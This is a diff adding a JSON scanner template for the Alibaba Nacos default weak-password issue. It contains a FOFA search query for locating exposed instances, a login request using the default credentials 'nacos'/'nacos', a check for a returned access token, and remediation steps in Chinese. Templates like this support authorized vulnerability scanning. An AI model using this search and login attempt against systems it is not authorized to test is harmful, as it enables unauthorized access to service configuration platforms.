@@ -1,0 +1,41 @@
+{
+  "product": "Alibaba Nacos",
+  "vul_name": "Nacos 默认弱口令",
+  "type": "默认口令/弱口令",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "Nacos 是一款开源的服务发现和配置管理平台。在 Nacos 中，默认的弱口令指的是在初始安装或者配置不当时使用的默认用户名和密码。通常，这些弱口令可以用于获取系统的初始访问权限或进行未授权访问。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "title=\"Nacos\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/NoId/p/16485084.html",
+  "fix": [
+    "登录 Nacos 控制台。",
+    "点击右上角的‘用户头像’，选择‘密码修改’。",
+    "输入当前密码和新密码(非弱密码)，然后提交。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/nacos/v1/auth/users/login",
+      "data": {
+        "username": "nacos",
+        "password": "nacos"
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "accessToken"
+        }
+      ]
+    }
+  }
+}
